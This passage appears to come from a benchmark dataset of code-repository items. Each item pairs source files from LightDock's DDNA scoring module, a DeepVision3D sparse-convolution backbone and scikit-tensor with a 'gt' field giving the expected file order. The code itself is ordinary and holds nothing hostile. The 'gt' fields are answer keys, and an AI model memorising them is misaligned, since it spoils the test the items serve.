\"N.pl3\",\n        \"CZ\": \"C.cat\",\n        \"NH1\": \"N.pl3\",\n        \"NH2\": \"N.pl3\",\n    },\n    \"LYS\": {\n        \"N\": \"N.am\",\n        \"CA\": \"C.3\",\n        \"C\": \"C.2\",\n        \"O\": \"O.2\",\n        \"CB\": \"C.3\",\n        \"CG\": \"C.3\",\n        \"CD\": \"C.3\",\n        \"CE\": \"C.3\",\n        \"NZ\": \"N.4\",\n    },\n    \"PRO\": {\n        \"N\": \"N.am\",\n        \"CA\": \"C.3\",\n        \"C\": \"C.2\",\n        \"O\": \"O.2\",\n        \"CB\": \"C.3\",\n        \"CG\": \"C.3\",\n        \"CD\": \"C.3\",\n    },\n    \"T\": {\n        \"P\": \"P.3\",\n        \"O1P\": \"O.co2\",\n        \"O2P\": \"O.co2\",\n        \"O5*\": \"O.3\",\n        \"C5*\": \"C.3\",\n        \"C4*\": \"C.3\",\n        \"O4*\": \"O.3\",\n        \"C3*\": \"C.3\",\n        \"O3*\": \"O.3\",\n        \"C2*\": \"C.3\",\n        \"C1*\": \"C.3\",\n        \"N1\": \"N.am\",\n        \"C2\": \"C.2\",\n        \"O2\": \"O.2\",\n        \"N3\": \"N.am\",\n        \"C4\": \"C.2\",\n        \"O4\": \"O.2\",\n        \"C5\": \"C.2\",\n        \"C5M\": \"C.3\",\n        \"C6\": \"C.2\",\n    },\n    \"DT\": {\n        \"P\": \"P.3\",\n        \"O1P\": \"O.co2\",\n        \"O2P\": \"O.co2\",\n        \"O5'\": \"O.3\",\n        \"C5'\": \"C.3\",\n        \"C4'\": \"C.3\",\n        \"O4'\": \"O.3\",\n        \"C3'\": \"C.3\",\n        \"O3'\": \"O.3\",\n        \"C2'\": \"C.3\",\n        \"C1'\": \"C.3\",\n        \"N1\": \"N.am\",\n        \"C2\": \"C.2\",\n        \"O2\": \"O.2\",\n        \"N3\": \"N.am\",\n        \"C4\": \"C.2\",\n        \"O4\": \"O.2\",\n        \"C5\": \"C.2\",\n        \"C7\": \"C.3\",\n        \"C6\": \"C.2\",\n    },\n    \"A\": {\n        \"P\": \"P.3\",\n        \"O1P\": \"O.co2\",\n        \"O2P\": \"O.co2\",\n        \"O5*\": \"O.3\",\n        \"C5*\": \"C.3\",\n        \"C4*\": \"C.3\",\n        \"O4*\": \"O.3\",\n        \"C3*\": \"C.3\",\n        \"O3*\": \"O.3\",\n        \"C2*\": \"C.3\",\n        \"O2*\": \"O.3\",\n        \"C1*\": \"C.3\",\n        \"N9\": \"N.pl3\",\n        \"C8\": \"C.2\",\n        \"N7\": \"N.2\",\n        \"C5\": \"C.ar\",\n        \"C6\": \"C.ar\",\n        \"N6\": \"N.pl3\",\n        \"N1\": \"N.ar\",\n        \"C2\": \"C.ar\",\n        \"N3\": \"N.ar\",\n        \"C4\": \"C.ar\",\n    },\n    \"DA\": {\n        \"P\": \"P.3\",\n        \"O1P\": \"O.co2\",\n        \"O2P\": \"O.co2\",\n        \"O5'\": \"O.3\",\n        \"C5'\": \"C.3\",\n        \"C4'\": \"C.3\",\n        \"O4'\": \"O.3\",\n        \"C3'\": \"C.3\",\n        \"O3'\": \"O.3\",\n        \"C2'\": \"C.3\",\n        \"O2'\": \"O.3\",\n        \"C1'\": \"C.3\",\n        \"N9\": \"N.pl3\",\n        \"C8\": \"C.2\",\n        \"N7\": \"N.2\",\n        \"C5\": \"C.ar\",\n        \"C6\": \"C.ar\",\n        \"N6\": \"N.pl3\",\n        \"N1\": \"N.ar\",\n        \"C2\": \"C.ar\",\n        \"N3\": \"N.ar\",\n        \"C4\": \"C.ar\",\n    },\n    \"G\": {\n        \"P\": \"P.3\",\n        \"O1P\": \"O.co2\",\n        \"O2P\": \"O.co2\",\n        \"O5*\": \"O.3\",\n        \"C5*\": \"C.3\",\n        \"C4*\": \"C.3\",\n        \"O4*\": \"O.3\",\n        \"C3*\": \"C.3\",\n        \"O3*\": \"O.3\",\n        \"C2*\": \"C.3\",\n        \"O2*\": \"O.3\",\n        \"C1*\": \"C.3\",\n        \"N9\": \"N.pl3\",\n        \"C8\": \"C.2\",\n        \"N7\": \"N.2\",\n        \"C5\": \"C.2\",\n        \"C6\": \"C.2\",\n        \"O6\": \"O.2\",\n        \"N1\": \"N.am\",\n        \"C2\": \"C.2\",\n        \"N2\": \"N.pl3\",\n        \"N3\": \"N.2\",\n        \"C4\": \"C.2\",\n    },\n    \"DG\": {\n        \"P\": \"P.3\",\n        \"O1P\": \"O.co2\",\n        \"O2P\": \"O.co2\",\n        \"O5'\": \"O.3\",\n        \"C5'\": \"C.3\",\n        \"C4'\": \"C.3\",\n        \"O4'\": \"O.3\",\n        \"C3'\": \"C.3\",\n        \"O3'\": \"O.3\",\n        \"C2'\": \"C.3\",\n        \"O2'\": \"O.3\",\n        \"C1'\": \"C.3\",\n        \"N9\": \"N.pl3\",\n        \"C8\": \"C.2\",\n        \"N7\": \"N.2\",\n        \"C5\": \"C.2\",\n        \"C6\": \"C.2\",\n        \"O6\": \"O.2\",\n        \"N1\": \"N.am\",\n        \"C2\": \"C.2\",\n        \"N2\": \"N.pl3\",\n        \"N3\": \"N.2\",\n        \"C4\": \"C.2\",\n    },\n    \"C\": {\n        \"P\": \"P.3\",\n        \"O1P\": \"O.co2\",\n        \"O2P\": \"O.co2\",\n        \"O5*\": \"O.3\",\n        \"C5*\": \"C.3\",\n        \"C4*\": \"C.3\",\n        \"O4*\": \"O.3\",\n        \"C3*\": \"C.3\",\n        \"O3*\": \"O.3\",\n        \"C2*\": \"C.3\",\n        \"O2*\": \"O.3\",\n        \"C1*\": \"C.3\",\n        \"N1\": \"N.am\",\n        \"C2\": \"C.2\",\n        \"O2\": \"O.2\",\n        \"N3\": \"N.2\",\n        \"C4\": \"C.2\",\n        \"N4\": \"N.pl3\",\n        \"C5\": \"C.2\",\n        \"C6\": \"C.2\",\n    },\n    \"DC\": {\n        \"P\": \"P.3\",\n        \"O1P\": \"O.co2\",\n        \"O2P\": \"O.co2\",\n        \"O5'\": \"O.3\",\n        \"C5'\": \"C.3\",\n        \"C4'\": \"C.3\",\n        \"O4'\": \"O.3\",\n        \"C3'\": \"C.3\",\n        \"O3'\": \"O.3\",\n        \"C2'\": \"C.3\",\n        \"O2'\": \"O.3\",\n        \"C1'\": \"C.3\",\n        \"N1\": \"N.am\",\n        \"C2\": \"C.2\",\n        \"O2\": \"O.2\",\n        \"N3\": \"N.2\",\n        \"C4\": \"C.2\",\n        \"N4\": \"N.pl3\",\n        \"C5\": \"C.2\",\n        \"C6\": \"C.2\",\n    },\n}\n\natom_types = [\n    \"C.3\",\n    \"C.2\",\n    \"C.ar\",\n    \"C.cat\",\n    \"N.4\",\n    \"N.2\",\n    \"N.ar\",\n    \"N.am\",\n    \"N.pl3\",\n    \"O.3\",\n    \"O.2\",\n    \"O.co2\",\n    \"S.3\",\n    \"S.o2\",\n    \"P.3\",\n    \"F\",\n    \"Cl\",\n    \"Br\",\n    \"Met\",\n]\n\n\nclass DDNAPotential(object):\n\n\n    def __init__(self):\n        data_path = os.path.join(os.path.dirname(os.path.realpath(__file__)), \"data\")\n        self.potentials = DDNAPotential._read_potentials(\n            os.path.join(data_path, \"fort.21_xscore_noH_Met\")\n        )\n        self.map = DDNAPotential._createmap()\n\n    @staticmethod\n    def _read_potentials(data_file_name):\n\n        potentials = [0.0] * (21 * 20 * 20)\n        D1 = 20 * 20\n        D2 = 20\n        with open(data_file_name) as input_handle:\n            for line in input_handle:\n                line = line.rstrip(os.linesep)\n                fields = line.split()\n                if len(fields) == 6:\n                    energy = float(fields[2])\n                    m = int(fields[3])\n                    i = int(fields[4])\n                    j = int(fields[5])\n                    potentials[m * D1 + i * D2 + j] = potentials[\n                        m * D1 + j * D2 + i\n                    ] = energy\n        return potentials\n\n    @staticmethod\n    def _createmap():\n        map = [-1] * 700\n        for i in range(1, 50):\n            if i < 4:\n                map[i] = 1\n            if i >= 4 and i < 16:\n                map[i] = i - 2\n            if i >= 16 and i < 50:\n                map[i] = int(i * 0.5) + 6\n        return map\n\n\nclass DDNAAdapter(ModelAdapter):\n\n\n    def _get_docking_model(self, molecule, restraints):\n\n        parsed_restraints = {}\n        ddna_objects = []\n        atom_index = 0\n        for chain in molecule.chains:\n            for residue in chain.residues:\n                res_id = (\n                    f\"{chain.cid}.{residue.name}.{residue.number}{residue.insertion}\"\n                )\n                in_restraint = False\n                if restraints and res_id in restraints:\n                    parsed_restraints[res_id] = []\n                    in_restraint = True\n\n                for rec_atom in residue.atoms:\n                    try:\n                        ddna_atom_type = atom_types.index(\n                            atom_map[rec_atom.residue_name][rec_atom.name]\n                        )\n                    except KeyError:\n                        raise NotSupportedInScoringError(\n                            f\"Atom {rec_atom.name} in residue {rec_atom.residue_name} not supported\"\n                        )\n                    ddna_objects.append(ddna_atom_type)\n                    if in_restraint:\n                        parsed_restraints[res_id].append(atom_index)\n                    atom_index += 1\n        try:\n            return DockingModel(\n                ddna_objects,\n                molecule.copy_coordinates(),\n                parsed_restraints,\n                n_modes=molecule.n_modes.copy(),\n            )\n        except AttributeError:\n            return DockingModel(\n                ddna_objects, molecule.copy_coordinates(), parsed_restraints\n            )\n\n\nclass DDNA(ScoringFunction):\n\n\n    def __init__(self, weight=1.0):\n        super(DDNA, self).__init__(weight)\n        self.potential = DDNAPotential()\n        self.cutoff = DEFAULT_CONTACT_RESTRAINTS_CUTOFF\n\n    def __call__(self, receptor, receptor_coordinates, ligand, ligand_coordinates):\n        energy, interface_receptor, interface_ligand = calculate_ddna(\n            receptor,\n            receptor_coordinates,\n            ligand,\n            ligand_coordinates,\n            self.potential.potentials,\n            self.potential.map,\n            interface_cutoff=self.cutoff,\n        )\n\n        perc_receptor_restraints = ScoringFunction.restraints_satisfied(\n            receptor.restraints, interface_receptor\n        )\n        perc_ligand_restraints = ScoringFunction.restraints_satisfied(\n            ligand.restraints, interface_ligand\n        )\n        return (\n            energy + perc_receptor_restraints * energy + perc_ligand_restraints * energy\n        ) * self.weight\n\n\n\nDefinedScoringFunction = DDNA\nDefinedModelAdapter = DDNAAdapter\n",
        "gt": [
            "'lightdock/lightdock/scoring/ddna/cython/__init__.py'",
            "'lightdock/lightdock/scoring/ddna/driver.py'",
            "'lightdock/lightdock/test/scoring/test_ddna_function.py'"
        ]
    },
    {
        "files": [
            "'DeepVision3D/EQNet/eqnet/models/support_producer/spconv_backbone.py'",
            "'DeepVision3D/DVSegmentation/models/__init__.py'",
            "'DeepVision3D/EQNet/eqnet/models/base.py'",
            "'DeepVision3D/EQNet/eqnet/models/support_producer/__init__.py'"
        ],
        "content": "'DeepVision3D/EQNet/eqnet/models/support_producer/spconv_backbone.py'\n:from functools import partial\n\nimport torch\nimport torch.nn as nn\nfrom torch.nn import functional as F\nimport numpy as np\n\n\nfrom ..base import BasicEQModules\nfrom eqnet.utils.spconv_utils import spconv, replace_feature\nfrom ...utils.spconv_utils import replace_feature, spconv\n\n\ndef post_act_block(in_channels, out_channels, kernel_size, indice_key=None, stride=1, padding=0,\n                   conv_type='subm', norm_fn=None):\n\n    if conv_type == 'subm':\n        conv = spconv.SubMConv3d(in_channels, out_channels, kernel_size, bias=False, indice_key=indice_key)\n    elif conv_type == 'spconv':\n        conv = spconv.SparseConv3d(in_channels, out_channels, kernel_size, stride=stride, padding=padding,\n                                   bias=False, indice_key=indice_key)\n    elif conv_type == 'inverseconv':\n        conv = spconv.SparseInverseConv3d(in_channels, out_channels, kernel_size, indice_key=indice_key, bias=False)\n    else:\n        raise NotImplementedError\n\n    m = spconv.SparseSequential(\n        conv,\n        norm_fn(out_channels),\n        nn.ReLU(),\n    )\n\n    return m\n\n\nclass SparseBasicBlock(spconv.SparseModule):\n    expansion = 1\n\n    def __init__(self, in_channels, out_channels, kernel_size=None,\n                 indice_key=None, stride=1, padding=0,\n                 conv_type=None, norm_fn=None):\n        super(SparseBasicBlock, self).__init__()\n\n        assert norm_fn is not None\n        bias = norm_fn is not None\n        self.conv1 = spconv.SubMConv3d(\n            in_channels, out_channels, kernel_size=kernel_size,\n            stride=stride, padding=padding, bias=bias, indice_key=indice_key\n        )\n        self.bn1 = norm_fn(out_channels)\n        self.relu = nn.ReLU()\n        self.conv2 = spconv.SubMConv3d(\n            out_channels, out_channels, kernel_size=kernel_size,\n            stride=stride, padding=padding, bias=bias, indice_key=indice_key\n        )\n        self.bn2 = norm_fn(out_channels)\n        self.stride = stride\n\n    def forward(self, x):\n        identity = x\n\n        out = self.conv1(x)\n        out = replace_feature(out, self.bn1(out.features))\n        out = replace_feature(out, self.relu(out.features))\n\n        out = self.conv2(out)\n        out = replace_feature(out, self.bn2(out.features))\n\n        out = replace_feature(out, out.features + identity.features)\n        out = replace_feature(out, self.relu(out.features))\n\n        return out\n\n\nclass VoxelBackboneBase(BasicEQModules):\n    def __init__(self, model_cfg, adapt_model_cfg):\n        super().__init__(model_cfg=model_cfg, adapt_model_cfg=adapt_model_cfg)\n        norm_fn = partial(nn.BatchNorm1d, eps=1e-3, momentum=0.01)\n\n        sparse_shape = self.model_cfg.grid_size\n        if isinstance(sparse_shape, list):\n            sparse_shape = np.array(sparse_shape).astype(np.int64)\n        self.sparse_shape = sparse_shape[::-1] + [1, 0, 0]\n        input_channels = self.model_cfg.input_channels\n\n        default_block = post_act_block\n        block_dict = {\n            'default_block': default_block,\n            'sparse_res_block': SparseBasicBlock,\n        }\n\n        conv_input_cfg = self.model_cfg.get(\n            'INIT_CONV_CFG',\n            dict(\n                conv_type='subm', out_channels=16, kernel_size=3,\n                indice_key='init_conv', stride=1, padding=0,\n            ))\n        self.conv_input = default_block(\n            input_channels,\n            out_channels=conv_input_cfg.get('out_channels'),\n            kernel_size=conv_input_cfg.get('kernel_size'),\n            indice_key=conv_input_cfg.get('indice_key'),\n            stride=conv_input_cfg.get('stride'),\n            padding=conv_input_cfg.get('padding'),\n            conv_type=conv_input_cfg.get('conv_type'),\n            norm_fn=norm_fn)\n        input_channels = conv_input_cfg.get('out_channels')\n\n\n        backbone_cfg = self.model_cfg.get(\n            'BACKBONE_CFG',\n\n            dict(\n                block_types=[\n                    ['default_block'],\n                    ['default_block', 'default_block', 'default_block'],\n                    ['default_block', 'default_block', 'default_block'],\n                    ['default_block', 'default_block', 'default_block'],\n                    ['default_block']\n                ],\n\n                out_channels=[\n                    16, 32, 64, 64, 128\n                ],\n\n                conv_type=[\n                    'subm', 'spconv', 'spconv', 'spconv', 'spconv'\n                ],\n\n                kernel_size=[\n                    3, 3, 3, 3, [3, 1, 1]\n                ],\n\n                stride=[\n                    1, 2, 2, 2, [2, 1, 1]\n                ],\n\n                padding=[\n                    1, 1, 1, [0, 1, 1], 0\n                ]\n            )\n        )\n        block_types = backbone_cfg['block_types']\n        out_channels = backbone_cfg['out_channels']\n        conv_type = backbone_cfg['conv_type']\n        kernel_size = backbone_cfg['kernel_size']\n        stride = backbone_cfg['stride']\n        padding = backbone_cfg['padding']\n        self.block_num = len(block_types)\n        self.level_strides = []\n\n        for i in range(self.block_num):\n            blocks = []\n            cur_block_types = block_types[i]\n            cur_block_num = len(cur_block_types)\n            block0 = block_dict[cur_block_types[0]](\n                input_channels, out_channels[i], kernel_size[i],\n                indice_key='block%d_%d' % (i, 0),\n                stride=stride[i],\n                padding=padding[i],\n                conv_type=conv_type[i],\n                norm_fn=norm_fn)\n            blocks.append(block0)\n            input_channels = out_channels[i]\n\n\n            cur_level_stride = stride[i] if not isinstance(stride[i], list) else stride[i][-1]\n            if len(self.level_strides) == 0:\n                self.level_strides.append(cur_level_stride)\n            else:\n                self.level_strides.append(self.level_strides[-1] * cur_level_stride)\n\n            for j in range(1, cur_block_num):\n                blocks.append(\n                    block_dict[cur_block_types[j]](\n                        input_channels, input_channels, 3,\n                        indice_key='block%d' % i,\n                        stride=1, padding=1, conv_type='subm', norm_fn=norm_fn\n                    )\n                )\n\n            setattr(self, 'conv%d'%(i+1), spconv.SparseSequential(*blocks))\n\n        self.num_point_features = input_channels\n\n        self.encoded_spconv_tensor_key = self.model_cfg.get(\n            'ENCODED_SPCONV_TENSOR_KEY', 'conv%d'%self.block_num)\n\n    def _forward_input_dict(self, input_dict):\n\n        voxel_features, voxel_coords = input_dict['voxel_features'], input_dict['voxel_coords']\n        batch_size = input_dict['batch_size']\n        input_sp_tensor = spconv.SparseConvTensor(\n            features=voxel_features,\n            indices=voxel_coords.int(),\n            spatial_shape=input_dict.get('sparse_shape', self.sparse_shape),\n            batch_size=batch_size\n        )\n\n        x = self.conv_input(input_sp_tensor)\n\n        x_out = []\n        encoded_spconv_tensor, encoded_spconv_stride = None, None\n        for i in range(self.block_num):\n            cur_block_key = 'conv%d'%(i+1)\n            x = getattr(self, cur_block_key)(x)\n            if cur_block_key == self.encoded_spconv_tensor_key:\n                encoded_spconv_tensor = x\n                encoded_spconv_stride = self.level_strides[i]\n            x_out.append(x)\n        ret = dict(\n            x_out=x_out,\n            encoded_spconv_tensor=encoded_spconv_tensor,\n            encoded_spconv_stride=encoded_spconv_stride,\n        )\n        ret.update(input_dict)\n        return ret\n\n\nclass DVSegVoxelBackbone(VoxelBackboneBase):\n    def __init__(self, model_cfg, **kwargs):\n        super().__init__(model_cfg=model_cfg, adapt_model_cfg=kwargs)\n\n    def _parse_input_dict(self, data_dict):\n\n        input_dict = dict(\n            batch_size=data_dict['batch_size'],\n            voxel_features=data_dict['voxel_features'],\n            voxel_coords=data_dict['voxel_coords'],\n            sparse_shape=data_dict['sparse_shape']\n        )\n        return input_dict\n\n    def _parse_output_dict(self, output_dict):\n        x_out = output_dict['x_out']\n        new_data_dict = dict(\n            encoded_spconv_tensor=output_dict['encoded_spconv_tensor'],\n            encoded_spconv_tensor_stride=output_dict['encoded_spconv_stride'],\n            multi_scale_3d_features=dict(),\n            multi_scale_3d_strides=dict(),\n        )\n        for i, x in enumerate(x_out):\n            new_data_dict['multi_scale_3d_features']['x_conv%d' % (i + 1)] = x\n            new_data_dict['multi_scale_3d_strides']['x_conv%d' % (i + 1)] = self.level_strides[i]\n        return new_data_dict\n\n\n\nclass PCDetVoxelBackbone(VoxelBackboneBase):\n\n    def __init__(self, model_cfg, **kwargs):\n        super().__init__(model_cfg=model_cfg,\n                         adapt_model_cfg=kwargs)\n\n    def _parse_input_dict(self, data_dict):\n        input_dict = dict(\n            batch_size=data_dict['batch_size'],\n            voxel_features=data_dict['voxel_features'],\n            voxel_coords=data_dict['voxel_coords']\n        )\n        return input_dict\n\n    def _parse_output_dict(self, output_dict):\n        x_out = output_dict['x_out']\n        new_data_dict = dict(\n            encoded_spconv_tensor=output_dict['encoded_spconv_tensor'],\n            encoded_spconv_tensor_stride=output_dict['encoded_spconv_stride'],\n            multi_scale_3d_features=dict(),\n            multi_scale_3d_strides=dict(),\n        )\n        for i, x in enumerate(x_out):\n            new_data_dict['multi_scale_3d_features']['x_conv%d' % (i+1)] = x\n            new_data_dict['multi_scale_3d_strides']['x_conv%d' % (i+1)] = self.level_strides[i]\n        return new_data_dict\n\n\nfrom mmdet.models import BACKBONES\nfrom mmdet3d.ops import Voxelization\nfrom mmcv.runner import force_fp32\n@BACKBONES.register_module()\nclass MMDet3DVoxelBackbone(VoxelBackboneBase):\n\n    def __init__(self, model_cfg, **kwargs):\n        super().__init__(model_cfg=model_cfg,\n                         adapt_model_cfg=kwargs)\n\n\n        voxel_layer_cfg = self.model_cfg.VOXEL_LAYER_CFG\n        self.voxel_layer = Voxelization(**voxel_layer_cfg)\n\n        voxel_encoder_cfg = self.model_cfg.VOXEL_ENCODER_CFG\n        self.num_voxel_encoder_features = voxel_encoder_cfg.get('NUM_FEATURES', 4)\n\n    @torch.no_grad()\n    @force_fp32()\n    def _voxelize(self, points):\n\n        voxels, coors, num_points = [], [], []\n\n        for idx, res in enumerate(points):\n            res_voxels, res_coors, res_num_points = self.voxel_layer(res)\n            voxels.append(res_voxels)\n            coors.append(res_coors)\n            num_points.append(res_num_points)\n\n        voxels = torch.cat(voxels, dim=0)\n        num_points = torch.cat(num_points, dim=0)\n        coors_batch = []\n        for i, coor in enumerate(coors):\n            coor_pad = F.pad(coor, (1, 0), mode='constant', value=i)\n            coors_batch.append(coor_pad)\n        coors_batch = torch.cat(coors_batch, dim=0)\n        return voxels, num_points, coors_batch\n\n    @force_fp32(out_fp16=True)\n    def _voxel_encoder(self, features, num_points, coors):\n\n        points_mean = features[:, :, :self.num_voxel_encoder_features].sum(\n            dim=1, keepdim=False) / num_points.type_as(features).view(-1, 1)\n        return points_mean.contiguous()\n\n    def _split_point_feats(self, points):\n\n        xyz = points[..., 0:3].contiguous()\n        if points.size(-1) > 3:\n            features = points[..., 3:].transpose(1, 2).contiguous()\n        else:\n            features = None\n\n        return xyz, features\n\n    def _parse_input_dict(self, points):\n\n\n        xyz, feat_transposed = self._split_point_feats(points)\n\n        xyz_min, _ = xyz.min(1)\n        min_normed_xyz = xyz - xyz_min[:, None, :]\n\n        if feat_transposed is not None:\n            feat = feat_transposed.transpose(1, 2).contiguous()\n            min_normed_xyz_feat = torch.cat([min_normed_xyz, feat], dim=-1)\n        else:\n            min_normed_xyz_feat = min_normed_xyz\n\n\n        voxels, num_points, coors = self._voxelize(min_normed_xyz_feat)\n        voxel_features = self._voxel_encoder(voxels, num_points, coors)\n\n\n        bs, npoint = min_normed_xyz.shape[:2]\n        batch_idx = torch.arange(bs).view(bs, 1, 1).repeat(1, npoint, 1).contiguous()\n        batch_idx = batch_idx.to(min_normed_xyz.device)\n        min_normed_points = torch.cat([batch_idx, min_normed_xyz], dim=-1).view(-1, 4)\n\n        input_dict = dict(\n            batch_size=bs,\n            voxel_features=voxel_features,\n            voxel_coords=coors,\n            points=min_normed_points,\n            xyz_min=xyz_min,\n        )\n        return input_dict\n\n    def _parse_output_dict(self, output_dict):\n        x_out = output_dict['x_out']\n        new_data_dict = dict(\n            encoded_spconv_tensor=output_dict['encoded_spconv_tensor'],\n            encoded_spconv_tensor_stride=output_dict['encoded_spconv_stride'],\n            multi_scale_3d_features=dict(),\n            multi_scale_3d_strides=dict(),\n\n            points=output_dict['points'],\n            xyz_min=output_dict['xyz_min'],\n            batch_size=output_dict['batch_size'],\n        )\n        for i, x in enumerate(x_out):\n            new_data_dict['multi_scale_3d_features']['x_conv%d' % (i+1)] = x\n            new_data_dict['multi_scale_3d_strides']['x_conv%d' % (i+1)] = self.level_strides[i]\n        return new_data_dict\n\n'DeepVision3D/DVSegmentation/models/__init__.py'\n:from eqnet.models.support_producer import __dvseg__all__ as __backbone__\nfrom eqnet.models.query_producer import __dvseg__all__ as __neck__\n\n'DeepVision3D/EQNet/eqnet/models/base.py'\n:\n\nfrom torch import nn\nfrom eqnet.utils.config import cfg, cfg_from_yaml_file, merge_new_config\n\n\nclass BasicEQModules(nn.Module):\n    def __init__(self, model_cfg, adapt_model_cfg):\n        super().__init__()\n        if isinstance(model_cfg, str):\n\n            cfg_from_yaml_file(model_cfg, cfg)\n            model_cfg = cfg\n\n        model_cfg = merge_new_config(model_cfg, adapt_model_cfg)\n        self.model_cfg = model_cfg\n\n    def _parse_input_dict(self, data_dict):\n\n        input_dict = dict()\n        return input_dict\n\n    def _forward_input_dict(self, input_dict):\n\n        output_dict = dict()\n        return output_dict\n\n    def _parse_output_dict(self, output_dict):\n\n        data_dict = dict()\n        return data_dict\n\n    def forward(self, data_dict):\n\n        input_dict = self._parse_input_dict(data_dict)\n        output_dict = self._forward_input_dict(input_dict)\n        new_data_dict = self._parse_output_dict(output_dict)\n\n        if isinstance(data_dict, dict):\n            data_dict.update(new_data_dict)\n        else:\n            data_dict = new_data_dict\n        return data_dict\n\n'DeepVision3D/EQNet/eqnet/models/support_producer/__init__.py'\n:\n\nfrom .pointnet2_backbone import PCDetPointNet2Backbone, MMDet3DPointNet2Backbone, DVClsPointNet2Backbone\nfrom .spconv_backbone import PCDetVoxelBackbone, MMDet3DVoxelBackbone, DVSegVoxelBackbone\n\n\n__pcdet_all__ = {\n    'EQPointNet2Backbone': PCDetPointNet2Backbone,\n    'EQVoxelBackbone': PCDetVoxelBackbone,\n}\n\n\n__mmdet3d_all__ = {\n    'MMDet3DPointNet2Backbone': MMDet3DPointNet2Backbone,\n    'MMDet3DVoxelBackbone': MMDet3DVoxelBackbone,\n}\n\n\n__dvcls__all__ = {\n    'EQPointNet2Backbone': DVClsPointNet2Backbone,\n}\n\n\n__dvseg__all__ = {\n    'EQVoxelBackbone': DVSegVoxelBackbone,\n}",
        "gt": [
            "'DeepVision3D/EQNet/eqnet/models/base.py'",
            "'DeepVision3D/EQNet/eqnet/models/support_producer/spconv_backbone.py'",
            "'DeepVision3D/EQNet/eqnet/models/support_producer/__init__.py'",
            "'DeepVision3D/DVSegmentation/models/__init__.py'"
        ]
    },
    {
        "files": [
            "'scikit-tensor/sktensor/tests/test_base.py'",
            "'scikit-tensor/sktensor/pyutils.py'",
            "'scikit-tensor/sktensor/sptensor.py'"
        ],
        "content": "'scikit-tensor/sktensor/tests/test_base.py'\n:from numpy import array\nfrom numpy.random import randn\nfrom sktensor.core import *\nfrom sktensor import dtensor, sptensor, ktensor\nfrom .ttm_fixture import T, U, Y\nfrom .sptensor_fixture import shape, vals, subs\n\n\ndef test_check_multiplication_dims():\n    ndims = 3\n    M = 2\n    assert ([1, 2] == check_multiplication_dims(0, ndims, M, without=True)).all()\n    assert ([0, 2] == check_multiplication_dims(1, ndims, M, without=True)).all()\n    assert ([0, 1] == check_multiplication_dims(2, ndims, M, without=True)).all()\n\n\ndef test_khatrirao():\n    A = array([\n        [1, 2, 3],\n        [4, 5, 6],\n        [7, 8, 9]\n    ])\n    B = array([\n        [1, 4, 7],\n        [2, 5, 8],\n        [3, 6, 9]\n    ])\n    C = array([\n        [1, 8, 21],\n        [2, 10, 24],\n        [3, 12, 27],\n        [4, 20, 42],\n        [8, 25, 48],\n        [12, 30, 54],\n        [7, 32, 63],\n        [14, 40, 72],\n        [21, 48, 81]\n    ])\n\n    D = khatrirao((A, B))\n    assert C.shape == D.shape\n    assert (C == D).all()\n\n\ndef test_dense_fold(T):\n    X = dtensor(T)\n    I, J, K = T.shape\n    X1 = X[:, :, 0]\n    X2 = X[:, :, 1]\n\n    U = X.unfold(0)\n    assert (3, 8) == U.shape\n    for j in range(J):\n        assert (U[:, j] == X1[:, j]).all()\n        assert (U[:, j + J] == X2[:, j]).all()\n\n    U = X.unfold(1)\n    assert (4, 6) == U.shape\n    for i in range(I):\n        assert (U[:, i] == X1[i, :]).all()\n        assert (U[:, i + I] == X2[i, :]).all()\n\n    U = X.unfold(2)\n    assert (2, 12) == U.shape\n    for k in range(U.shape[1]):\n        assert (U[:, k] == array([X1.flatten('F')[k], X2.flatten('F')[k]])).all()\n\n\ndef test_dtensor_fold_unfold():\n    sz = (10, 35, 3, 12)\n    X = dtensor(randn(*sz))\n    for i in range(4):\n        U = X.unfold(i).fold()\n        assert (X == U).all()\n\n\ndef test_dtensor_ttm(T, U, Y):\n    X = dtensor(T)\n    Y2 = X.ttm(U, 0)\n    assert (2, 4, 2) == Y2.shape\n    assert (Y == Y2).all()\n\n\ndef test_spttv(subs, vals, shape):\n\n\n\n\n\n\n    S = sptensor(subs, vals, shape=shape)\n    K = ktensor([randn(shape[0], 2), randn(shape[1], 2), randn(shape[2], 2)])\n    K.innerprod(S)\n\n'scikit-tensor/sktensor/pyutils.py'\n:def inherit_docstring_from(cls):\n    def docstring_inheriting_decorator(fn):\n        fn.__doc__ = getattr(cls, fn.__name__).__doc__\n        return fn\n    return docstring_inheriting_decorator\n\n\ndef is_sequence(obj):\n\n    try:\n        from collections import Sequence\n    except ImportError:\n        from operator import isSequenceType\n        return isSequenceType(obj)\n    else:\n        return isinstance(obj, Sequence)\n\n\ndef is_number(obj):\n\n    try:\n        from numbers import Number\n    except ImportError:\n        from operator import isNumberType\n        return isNumberType(obj)\n    else:\n        return isinstance(obj, Number)\n\n\ndef func_attr(f, attr):\n\n    if hasattr(f, 'func_%s' % attr):\n        return getattr(f, 'func_%s' % attr)\n    elif hasattr(f, '__%s__' % attr):\n        return getattr(f, '__%s__' % attr)\n    else:\n        raise ValueError('Object %s has no attr' % (str(f), attr))\n\n\ndef from_to_without(frm, to, without, step=1, skip=1, reverse=False, separate=False):\n\n    if reverse:\n        frm, to = (to - 1), (frm - 1)\n        step *= -1\n        skip *= -1\n    a = list(range(frm, without, step))\n    b = list(range(without + skip, to, step))\n    if separate:\n        return a, b\n    else:\n        return a + b\n\n'scikit-tensor/sktensor/sptensor.py'\n:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nimport numpy as np\nfrom numpy import zeros, ones, array, arange, copy, ravel_multi_index, unravel_index\nfrom numpy import setdiff1d, hstack, hsplit, vsplit, sort, prod, lexsort, unique, bincount\nfrom scipy.sparse import coo_matrix\nfrom scipy.sparse import issparse as issparse_mat\nfrom sktensor.core import tensor_mixin\nfrom sktensor.utils import accum\nfrom sktensor.dtensor import unfolded_dtensor\nfrom sktensor.pyutils import inherit_docstring_from, from_to_without\n\n\n__all__ = [\n    'concatenate',\n    'fromarray',\n    'sptensor',\n    'unfolded_sptensor',\n]\n\n\nclass sptensor(tensor_mixin):\n\n\n    def __init__(self, subs, vals, shape=None, dtype=None, accumfun=None, issorted=False):\n        if not isinstance(subs, tuple):\n            raise ValueError('Subscripts must be a tuple of array-likes')\n        if len(subs[0]) != len(vals):\n            raise ValueError('Subscripts and values must be of equal length')\n        if dtype is None:\n            dtype = array(vals).dtype\n        for i in range(len(subs)):\n            if array(subs[i]).dtype.kind != 'i':\n                raise ValueError('Subscripts must be integers')\n\n        vals = array(vals, dtype=dtype)\n        if accumfun is not None:\n            vals, subs = accum(\n                subs, vals,\n                issorted=False, with_subs=True, func=accumfun\n            )\n        self.subs = 